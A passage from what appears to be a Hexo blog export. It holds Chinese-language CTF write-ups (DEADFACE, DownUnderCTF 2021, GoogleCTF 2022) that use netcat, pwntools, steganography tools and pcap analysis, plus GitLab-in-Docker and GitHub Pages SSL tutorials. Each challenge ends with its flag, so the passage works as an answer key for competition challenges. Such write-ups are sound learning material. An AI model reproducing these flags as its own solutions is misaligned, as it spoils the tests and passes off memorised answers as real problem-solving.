ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgCjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0cmVhbQ1lbmRvYmoNMyAwIG9iag08PC9GaWx0
ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNC9MZW5ndGggNDkvTiAxL1R5cGUvT2JqU3RtPj5zdHJlYW0N
CmjeslQwULCx0XfOL80rUTDU985MKY42NAYKBsXqh1QWpOoHJKanFtvZAQQYAOA1C68NCmVuZHN0
cmVhbQ1lbmRvYmoNNCAwIG9iag08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvRmlyc3QgNS9MZW5ndGgg
MTI0L04gMS9UeXBlL09ialN0bT4+c3RyZWFtDQpo3pTMsQrCMBRG4Ve5W5Oh7Z+rl6qUQmlWwQfo
kjQZuvRCiO+vILg4uZ/zORBoHPul5FB3PXyo2fgbgx0GNzBEGC2kARr7qbSYOWnMNG9FY6j0KEp+
odWcuI17XS2x66RjQC62v2v6Ra98/qLvPT23/Jc6TS8BBgAluTGrDQplbmRzdHJlYW0NZW5kb2Jq
DTUgMCBvYmoNPDwvRGVjb2RlUGFybXM8PC9Db2x1bW5zIDQvUHJlZGljdG9yIDEyPj4vRmlsdGVy
L0ZsYXRlRGVjb2RlL0lEWzwwMkYzNTg5OTNDMUQxNDRFOENGNkQyRjJBMjc5QUM0Rj48MUVCMkZC
MTkyOTFEQ0Q0RDk4Mzk3NzE1OUM5QTc1OTY+XS9JbmZvIDEwIDAgUi9MZW5ndGggNDgvUm9vdCAx
MiAwIFIvU2l6ZSAxMS9UeXBlL1hSZWYvV1sxIDIgMV0+PnN0cmVhbQ0KaN5iYgACJkaFKAYmBsY7
QIL3EpBg6AVxbwIlLk4GcRkYYQTTPyDByAAQYACsTAYdDQplbmRzdHJlYW0NZW5kb2JqDXN0YXJ0
eHJlZg0KMTE2DQolJUVPRg0K
</code></pre>
<p>在本地解码,保存至<code>flag.pdf</code></p>
<pre><code class="shell">~$ base64 -d encoded &gt; flag.pdf
</code></pre>
<p><strong>flag:</strong><code>flag&#123;deM0nn3_dat4_4_us&#125;</code></p>
<h1 id="The-Count"><a href="#The-Count" class="headerlink" title="The Count"></a>The Count</h1><p><em>Apparently DEADFACE is recruiting programmers, but spookyboi is a little apprehensive about recruiting amateurs. He&#39;s placed a password hash in the form of a flag for those able to solve his challenge. Solve the challenge and submit the flag as <code>flag&#123;SHA256_hash&#125;</code>.</em></p>
<p><em><a href="https://ghosttown.deadface.io/t/what-programming-needs-are-there/56/4">Link to Thread</a></em></p>
<p><em>code.deadface.io:50000</em></p>
<hr>
<p>使用nc命令连接服务器</p>
<pre><code class="shell">╭─ ~/CTF/DEADFACE
╰─$ nc code.deadface.io 50000
DEADFACE gatekeeper: Let us see how good your programming skills are.
If a = 0, b = 1, c = 2, etc.. Tell me what the sum of this word is:

 You have 5 seconds to give me an answer.

Your word is: tightfisted
Too slow!! Word has been reset!
</code></pre>
<p>我们取每一位字符的ASCII码后减去97,求和即可</p>
<pre><code class="python">from pwn import *

p = remote(&#39;code.deadface.io&#39;, 50000)

x = p.recvline_contains(b&#39;Your word&#39;)
word = x.decode().rsplit(&#39;:&#39;)[-1].strip()
count = sum([ord(x)-97 for x in word])
p.send(str(count).encode())
print(p.recvline())
print(p.recvline())
print(p.recvline())

</code></pre>
<p><strong>flag:</strong><code>flag&#123;d1c037808d23acd0dc0e3b897f344571ddce4b294e742b434888b3d9f69d9944&#125;</code></p>
<h1 id="Behind-the-Curtain"><a href="#Behind-the-Curtain" class="headerlink" title="Behind the Curtain"></a>Behind the Curtain</h1><p><em>This image was intercepted from Ghost Town. We think Donnell has hidden information here, but there doesn&#39;t seem to be anything special about the image. Can you help find the hidden information? Submit the flag as flag{this-is-the-flag}.</em></p>
<p><em><a href="https://tinyurl.com/26fd4pbs">Link to Image</a></em></p>
<p><em>SHA1: 29141eea42be29f8fa28a9a1cc5e5118e63577b2</em></p>
<hr>
<p>使用<code>Stegsolve</code>打开图片,选择<code>Frame Browser</code>,在Frame 2即可看到flag<br><img data-src="/../../CTF/DEADFACECTF/Steganography/images/Behind_the_Curtain.png" alt="Behind the Curtain"></p>
<p><strong>flag:</strong><code>flag&#123;L3t_m3_in&#125;</code></p>
<h1 id="Scary-Bunny"><a href="#Scary-Bunny" class="headerlink" title="Scary Bunny"></a>Scary Bunny</h1><p><em>What could be inside this creepy rabbit?</em></p>
<p><em><a href="https://tinyurl.com/4csyne6s">Download image</a></em></p>
<p><em>SHA1: 7ab2d9b1986ae12b780d0a2124a3adce6ed4c4e1</em></p>
<hr>
<p>使用<code>steghide info</code>查看图片隐写信息</p>
<pre><code class="shell">╭─ ~/CTF/DEADFACE
╰─$ steghide info bunny.jpg
&quot;bunny.jpg&quot;:
  format: jpeg
  capacity: 2.7 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file &quot;steganopayload730241.txt&quot;:
    size: 13.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
</code></pre>
<p>使用<code>steghide extract</code>提取隐写的文件<code>steganopayload730241.txt</code></p>
<pre><code class="shell">╭─ ~/CTF/DEADFACE
╰─$ steghide extract -sf bunny.jpg
Enter passphrase:
the file &quot;steganopayload730241.txt&quot; does already exist. overwrite ? (y/n) y
wrote extracted data to &quot;steganopayload730241.txt&quot;.

╭─ ~/CTF/DEADFACE
╰─$ cat steganopayload730241.txt
flag&#123;Carr0t&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;Carr0t&#125;</code></p>
<h1 id="Send-in-the-Clowns"><a href="#Send-in-the-Clowns" class="headerlink" title="Send in the Clowns"></a>Send in the Clowns</h1><p><em>There is a secret hidden somewhere in this image. Can you find it? Submit the flag as flag{this-is-the-flag}.</em></p>
<p><em><a href="https://tinyurl.com/y9xjz7b4">Link to Image</a><br>SHA1: 74eaae618bf508ef2715533bfdff3153dd996e89</em></p>
<hr>
<pre><code class="shell">╭─ ~/CTF/DEADFACE
╰─$ strings steg02.jpg |grep flag
flag&#123;s3nd_in_the_kl0wns&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;s3nd_in_the_kl0wns&#125;</code></p>
<h1 id="V0icE"><a href="#V0icE" class="headerlink" title="V0icE"></a>V0icE</h1><p><em>A friend of mine sent me an audio file which supposes to tell me the time of our night out meeting, but I can&#39;t comprehend the voice in the audio file. Can you help me figure it out? I want to hang out with my friends.</em></p>
<p><em><a href="https://tinyurl.com/2sa56kbk">Download file</a></em></p>
<p><em>SHA1:3173700e9ba2f062a18707b375fac61049310413</em></p>
<hr>
<p>用<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>打开<code>midnight.wav</code>,点击<code>Layer</code>-&gt;<code>Add Spectrogram</code>-&gt;<code>midnight.wav: All Channels Mixed</code></p>
<p><img data-src="/../../CTF/DEADFACECTF/Steganography/images/V0icE_01.png" alt="V0icE"></p>
<p>放大后即可看到隐藏在频谱图的flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Steganography/images/V0icE_02.png" alt="V0icE"></p>
<p><strong>flag:</strong><code>flag&#123;1257&#125;</code></p>
<h1 id="A-Warning"><a href="#A-Warning" class="headerlink" title="A Warning"></a>A Warning</h1><p><em>Luciafer is being watched! Someone on the inside of Lytton Labs can see what she is doing and is sending her a message.</em></p>
<p><em>One of them says: &quot;Stay away from Lytton Labs... you have been warned.&quot;</em></p>
<p><em>To find the flag, find the message. You&#39;ll know it when you see it. Submit the flag as <code>flag&#123;flag-goes-here&#125;</code>.</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>使用<a href="https://www.wireshark.org/download.html">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索“warning”,找到一个请求<code>da-warning-message.jpg</code>的HTTP请求</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning.png" alt="A-Warning"></p>
<p>找到该请求对应响应的数据包(16050),对着&quot;JPEG File Interchange Format&quot;右键,选择&quot;显示分组字节&quot;,即可看到flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-02.png" alt="image-20211106204519981"></p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/A-Warning-03.png" alt="image-20211106205413070"></p>
<p><strong>flag:</strong><code>flag&#123;angels-fear-to-tread&#125;</code></p>
<h1 id="Monster-from-the-Machine"><a href="#Monster-from-the-Machine" class="headerlink" title="Monster from the Machine"></a>Monster from the Machine</h1><p><em>Our person on the &quot;inside&quot; of Ghost Town was able to plant a packet sniffing device on Luciafer&#39;s computer. Based on our initial analysis, we know that she was attempting to hack a computer in Lytton Labs, and we have some idea of what she was doing, but we need a more in-depth analysis. This is where YOU come in.</em></p>
<p><em>We need YOU to help us analyze the packet capture. Look for relevant data to the potential attempted hack.</em></p>
<p><em>To gather some information on the victim, investigate the victim&#39;s computer activity. The &quot;victim&quot; was using a search engine to look up a name. Provide the name with standard capitalization: <code>flag&#123;Jerry Seinfeld&#125;</code>.</em></p>
<p><em><a href="https://tinyurl.com/35a45kc3">Download file</a></em></p>
<p><em>SHA1: 6c0caf366dae3e03bcbd7338de0030812536894c</em></p>
<hr>
<p>使用<a href="https://www.wireshark.org/download.html">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,按照<code>HTTP</code>过滤</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine-00.png" alt="Monstrum ex Machine"><br>右键,点击&quot;跟踪流&quot;-&gt;&quot;HTTP流&quot;<br><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/monstrum_ex_machine.png" alt="Monstrum ex Machine"></p>
<p><strong>flag:</strong><code>flag&#123;Charles Geschickter&#125;</code></p>
<h1 id="Release-the-Crackin"><a href="#Release-the-Crackin" class="headerlink" title="Release the Crackin&#39;!"></a>Release the Crackin&#39;!</h1><p><em>Luciafer cracked a password belonging to the victim. Submit the flag as: <code>flag&#123;password&#125;</code>.</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>使用<a href="https://www.wireshark.org/download.html">Wireshark</a>打开<code>pcap-challenge-final.pcapng</code>文件,搜索<code>logged</code>,找到正确的密码</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/release_the_crackin.png" alt="Release the Crackin"></p>
<p><strong>flag:</strong><code>flag&#123;darkangel&#125;</code></p>
<h1 id="The-SUM-of-All-FEARS"><a href="#The-SUM-of-All-FEARS" class="headerlink" title="The SUM of All FEARS"></a>The SUM of All FEARS</h1><p><em>After hacking a victim&#39;s computer, Luciafer downloaded several files, including two binaries with identical names, but with the extensions .exe and .bin (a Windows binary and a Linux binary, respectively).</em></p>
<p><em>What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5}</em></p>
<p><em>Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina.</em></p>
<hr>
<p>Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag</p>
<p>使用<a href="https://www.wireshark.org/download.html">Wireshark</a>分析<code>pcap-challenge-final.pcapng</code>文件,发现是下载了<code>lytton-crypt.exe</code>和<code>lytton-crypt.bin</code>两个文件</p>
<p>选中一个接收<code>lytton-crypt.exe</code>文件的数据包,右键点击“跟踪流”-&gt;&quot;TCP流&quot;</p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-01.png" alt="lytton-crypt"></p>
<p>然后点击“另存为”,保存为<code>lytton-crypt.exe</code></p>
<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-02.png" alt="lytton-crypt"></p>
<p>重复上述步骤,得到<code>lytton-crypt.bin</code>.然后计算两个文件的md5值</p>
<pre><code class="shell">╭─ ~/CTF/DEADFACE
╰─$ md5 lytton-crypt.*
MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953
MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28
</code></pre>
<p><strong>flag:</strong><code>flag&#123;9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>DEADFACECTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker搭建Gitlab仓库</title>
    <url>/posts/151510421/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol>
<li>拉取Gitlab镜像<br><code>docker pull gitlab/gitlab-ce</code></li>
</ol>
<img data-src="/posts/151510421/pasted-1.png" class="">

<ol start="2">
<li><p>创建文件夹<br><code>mkdir gitlab</code></p>
<span id="more"></span>
</li>
<li><p>创建容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure></li>
</ol>
<div class="note info">
            <p>也可以将8001修改为其他端口</p>
          </div>

<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><ol>
<li><p>修改配置文件<br><code>vi gitlab/config/gitlab.rb</code><br><code>external_url &#39;http://www.xxx.com:8001&#39;</code> or <code>external_url &#39;http://&#123;ip&#125;:8001&#39;</code></p>
</li>
<li><p>重启容器<br><code>docker restart gitlab</code></p>
</li>
</ol>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
<li>首次打开时需要设置管理员密码<img data-src="/posts/151510421/pasted-2.jpg" class=""></li>
<li>查看Clone信息<img data-src="/posts/151510421/pasted-0.png" class=""></li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Gitlab</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Github pages个人域名添加SSL</title>
    <url>/posts/18543/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>寒假的时候用Hexo+Github pages搭建了属于自己的博客，前不久才绑定了个人域名。作为一名有强迫症的程序猿，肯定还要给自己加一个绿色的小锁头。<br>在网上看别人的博客，大部分是用的<a href="https://www.cloudflare.com/">CloudFlare</a>提供的免费https服务，也有采用的阿里云提供的一年免费证书，我选择的是后者。</p>
<span id="more"></span>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>个人域名:<a href="https://zhaoqi99.github.io/">https:&#x2F;&#x2F;赵旗.top&#x2F;</a></li>
<li>Github pages</li>
<li>阿里云购买的SSL证书</li>
</ul>
<h2 id="添加SSL证书"><a href="#添加SSL证书" class="headerlink" title="添加SSL证书"></a>添加SSL证书</h2><ol>
<li>进入阿里云控制台，依次点击安全(云盾)-&gt;CA证书服务，然后点击右上角的购买证书。<br><img data-src="/images/20180410134416.jpg"></li>
<li>依次选择品牌为<code>Symantec</code>，保护类型为<code>一个域名</code>，证书类型此时会多出一个选项<code>免费型DV SSL</code>点击选择,然后点击立即购买，支付0.00元。<br><img data-src="/images/20180410134752.jpg"><br><img data-src="/images/20180410113516.jpg"><div class="note danger no-icon"><p>注意:免费的SSL证书有效期只有一年，过期之后就需要重新申请了。
</p></div></li>
<li>支付成功后，点击进入证书控制台，然后点击<code>补全</code>，填写相关信息，提交申请。<br><img data-src="/images/20180410140626.jpg"><br><img data-src="/images/20180410113758.jpg"><div class="note warning"><p>
域名验证类型选项记得勾选:证书绑定的域名在【阿里云的云解析】产品中，授权系统自动添加一条记录以完成域名授权验证。
</p></div></li>
<li>等待20分钟左右，即可收到签发成功的通知了，也可以在证书控制台中实时看到审核进度。</li>
<li>在浏览器中输入https:&#x2F;&#x2F;域名&#x2F; ，可以看到地址栏前面有一个小绿锁，很惊喜有没有~<br><img data-src="/images/20180410140910.jpg"></li>
</ol>
<h2 id="http强制跳转https"><a href="#http强制跳转https" class="headerlink" title="http强制跳转https"></a>http强制跳转https</h2><p>按照上述步骤添加了SSL证书后，发现如果在地址栏中输入的是https:&#x2F;&#x2F;域名&#x2F; 就会有绿锁头，如果输入的是http:&#x2F;&#x2F;域名&#x2F; ，则还是http,并不会自动跳转至https。怎样让访客点击http:&#x2F;&#x2F;域名&#x2F; 时能强制跳转到https呢？<br>在Google上看了好多的博客都没能找到解决方案，突然发现Github上有一个<code>Enforce HTTPS</code>选项，抱着试一试的心态，最后竟然成功了。</p>
<ol>
<li>登录Github，进入自己的Github.io项目中，点击<code>Setting</code>，往下拉，可以看到有个选项叫<code>Enforce HTTPS</code>,点击勾选。<br><img data-src="/images/20180410115944.jpg"></li>
<li>打开浏览器，在地址中输入自己的http:&#x2F;&#x2F;域名&#x2F; ，已经可以自动跳转到https下了，大功告成。</li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>DownUnderCTF2021 Writeup</title>
    <url>/posts/2302350511/</url>
    <content><![CDATA[<h1 id="Retro"><a href="#Retro" class="headerlink" title="Retro!"></a>Retro!</h1><p><em>Our original logo was created in paint, I wonder what other secrets it hides?</em></p>
<hr>
<p>题目给了一张图片:</p>
<img data-src="../../CTF/DownUnderCTF2021/Forensics/assets/og.jpg" alt="og" style="zoom:30%;" />

<p>使用<code>exiftool</code>工具查看图片元数据:</p>
<p><img data-src="/../../CTF/DownUnderCTF2021/Forensics/assets/exiftool.png" alt="exiftool"></p>
<p><strong>flag:</strong><code>DUCTF&#123;sicc_paint_skillz!&#125;</code></p>
<h1 id="General-Skills-Quiz"><a href="#General-Skills-Quiz" class="headerlink" title="General Skills Quiz"></a>General Skills Quiz</h1><p><em>QUIZ TIME! Just answer the questions. Pretty easy right?</em></p>
<p><em>Author: Crem</em></p>
<p><em><code>nc pwn-2021.duc.tf 31905</code></em></p>
<hr>
<p>本题要求使用<code>nc</code>命令连接远程服务器,并在30s内回答所有问题.</p>
<p>代码:</p>
<pre><code class="python">from pwn import *
from urllib.parse import unquote
import base64

def rot13(message):
    PAIRS = dict(zip(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,
                     &quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;))
    return &quot;&quot;.join(PAIRS.get(c, c) for c in message)

p = remote(&#39;pwn-2021.duc.tf&#39;, 31905)
p.send(b&#39;\n&#39;)
p.recvuntil(b&#39;ticking...&#39;, drop=True)
p.recvline()

while True:
    s = p.recvline().decode(&#39;utf-8&#39;).strip(&#39;\n&#39;)
    print(s)
    t = s.split()[-1]
    print(t)
    if &#39;1+1=?&#39; in s:
        p.send(&#39;2&#39;.encode())
    elif &#39;Decode this hex string and provide me the original number (base 10)&#39; in s:
        p.send(str(int(t, 16)).encode())
    elif &#39;Decode this hex string and provide me the original ASCII letter&#39; in s:
        p.send(chr(int(t, 16)).encode())
    elif &#39;Decode this URL encoded string and provide me the original ASCII symbols&#39; in s:
        p.send(unquote(t).encode())
    elif &#39;Decode this base64 string and provide me the plaintext&#39; in s:
        p.send(base64.b64decode(t))
    elif &#39;Encode this plaintext string and provide me the Base64&#39; in s:
        p.send(base64.b64encode(t.encode()))
    elif &#39;Decode this rot13 string and provide me the plaintext&#39; in s:
        p.send(rot13(t).encode())
    elif &#39;Encode this plaintext string and provide me the ROT13&#39; in s:
        p.send(rot13(t).encode())
    elif &#39;Decode this binary string and provide me the original number&#39; in s:
        p.send(str(int(t, 2)).encode())
    elif &#39;Encode this number and provide me the binary equivalent&#39; in s:
        p.send(bin(int(t)).encode())
    else:
        p.send(&#39;DUCTF\n&#39;.encode())
        print(p.recvall().decode())
        break
    p.send(&#39;\n&#39;.encode())
    p.recvline()
    p.recvline()
</code></pre>
<p><strong>flag:</strong><code>DUCTF&#123;you_aced_the_quiz!_have_a_gold_star_champion&#125;</code></p>
<h1 id="Who-goes-there"><a href="#Who-goes-there" class="headerlink" title="Who goes there?"></a>Who goes there?</h1><p><em>Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and created solely for this challenge as part of DownUnder CTF. These are real places however they have <strong>no association&#x2F;affiliation</strong> to the event, you are not required to call any place or make contact with anyone, doing so may disqualify you from the event.</em></p>
<p><em>Welcome to the team, glad you chose to join us - hopefully you’ll like it here and want to stay. Let me tell you about your first task:</em></p>
<p><em>We’ve observed an underground criminal RaaS operation calling back to this domain, can you find the number of the individual who registered the domain?</em></p>
<p><code>646f776e756e646572.xyz</code></p>
<hr>
<p>题目给了我们一个域名,要求我们找到注册人的联系电话</p>
<p>在<a href="https://who.is/whois/646f776e756e646572.xyz">whois</a>上搜索即可:</p>
<p><img data-src="/../../CTF/DownUnderCTF2021/OSINT/assets/whois.png" alt="Whois"></p>
<p><strong>flag:</strong><code>DUCTF&#123;+61.420091337&#125;</code></p>
<h1 id="no-strings"><a href="#no-strings" class="headerlink" title="no strings"></a>no strings</h1><p><em>This binary contains a free flag. No strings attached, seriously!</em></p>
<hr>
<p>使用<code>hexdump -C nostrings</code>查看16进制:</p>
<pre><code class="assembly">00002000  01 00 02 00 00 00 00 00  44 00 55 00 43 00 54 00  |........D.U.C.T.|
00002010  46 00 7b 00 73 00 74 00  72 00 69 00 6e 00 67 00  |F.&#123;.s.t.r.i.n.g.|
00002020  65 00 6e 00 74 00 5f 00  73 00 74 00 72 00 69 00  |e.n.t._.s.t.r.i.|
00002030  6e 00 67 00 73 00 5f 00  73 00 74 00 72 00 69 00  |n.g.s._.s.t.r.i.|
00002040  6e 00 67 00 7d 00 66 6c  61 67 3f 20 00 77 72 6f  |n.g.&#125;.flag? .wro|
00002050  6e 67 21 00 63 6f 72 72  65 63 74 21 00 00 00 00  |ng!.correct!....|
00002060  01 1b 03 3b 34 00 00 00  05 00 00 00 c0 ef ff ff  |...;4...........|
00002070  68 00 00 00 20 f0 ff ff  50 00 00 00 19 f1 ff ff  |h... ...P.......|
00002080  90 00 00 00 f0 f1 ff ff  b8 00 00 00 60 f2 ff ff  |............`...|
00002090  00 01 00 00 00 00 00 00  14 00 00 00 00 00 00 00  |................|
000020a0  01 7a 52 00 01 78 10 01  1b 0c 07 08 90 01 00 00  |.zR..x..........|
000020b0  14 00 00 00 1c 00 00 00  c8 ef ff ff 2f 00 00 00  |............/...|
000020c0  00 44 07 10 00 00 00 00  24 00 00 00 34 00 00 00  |.D......$...4...|
000020d0  50 ef ff ff 60 00 00 00  00 0e 10 46 0e 18 4a 0f  |P...`......F..J.|
000020e0  0b 77 08 80 00 3f 1a 3b  2a 33 24 22 00 00 00 00  |.w...?.;*3$&quot;....|
000020f0  24 00 00 00 5c 00 00 00  81 f0 ff ff d2 00 00 00  |$...\...........|
00002100  00 41 0e 10 86 02 43 0d  06 45 83 03 02 c8 0c 07  |.A....C..E......|
00002110  08 00 00 00 00 00 00 00  44 00 00 00 84 00 00 00  |........D.......|
00002120  30 f1 ff ff 65 00 00 00  00 46 0e 10 8f 02 49 0e  |0...e....F....I.|
00002130  18 8e 03 45 0e 20 8d 04  45 0e 28 8c 05 44 0e 30  |...E. ..E.(..D.0|
00002140  86 06 48 0e 38 83 07 47  0e 40 6e 0e 38 41 0e 30  |..H.8..G.@n.8A.0|
00002150  41 0e 28 42 0e 20 42 0e  18 42 0e 10 42 0e 08 00  |A.(B. B..B..B...|
00002160  10 00 00 00 cc 00 00 00  58 f1 ff ff 05 00 00 00  |........X.......|
00002170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</code></pre>
<p><strong>flag:</strong><code>DUCTF&#123;stringent_strings_string&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>DownUnderCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleCTF2022 Writeup</title>
    <url>/posts/632988450/</url>
    <content><![CDATA[<h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file...</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8">Attachment</a></em></p>
<hr>
<p>解压下载得到的文件<code>dump.zip</code>,得到<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>
<p>猜测可能有隐藏文件,用<code>binwalk</code>分析:</p>
<ul>
<li>文件名从<code>flag00.zip</code>到<code>flag18.zip</code></li>
<li>每个文件名出现36次</li>
</ul>
<pre><code class="bash">~$ binwalk dump.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt
135           0x87            Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt
256           0x100           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
345           0x159           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
434           0x1B2           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
523           0x20B           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
612           0x264           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
...
60598         0xECB6          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60687         0xED0F          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60776         0xED68          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60865         0xEDC1          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60954         0xEE1A          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
61043         0xEE73          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
61572         0xF084          End of Zip archive, footer length: 22
</code></pre>
<p>使用<code>strings</code>和<code>hexdump</code>分析,发现:</p>
<ul>
<li>包含文件<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>
<li>猜测flag的长度为18,每组<code>flagXX</code>表示了flag中的一个字符</li>
<li>dump出来任意一组<code>flagXX</code>,得到flag的字母表<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>
<li>已知flag格式为<code>CTF&#123;...&#125;</code></li>
</ul>
<pre><code class="bash">~$ strings dump.zip
V~uK)
hello.txtThere&#39;s more to it than meets the eye...
V~uK)
hello.txtPK
hi.txtFind a needle in the haystack...
hi.txtPK
flag00aPK
flag00PK
flag00bPK
flag00PK
flag00cPK
flag00PK
flag00dPK
flag00PK
flag00ePK
......
flag18PK
flag181PK
flag18PK
flag183PK
flag18PK
flag187PK
flag18PK
flag18&#125;PK
flag18PK
flag18_PK
flag18PK
</code></pre>
<pre><code class="bash">~$ hexdump -C dump.zip | head -n 30
00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|
00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|
00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|
00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|
00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|
00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|
00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|
00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|
00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|
00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|
000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |
000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |
000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|
000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|
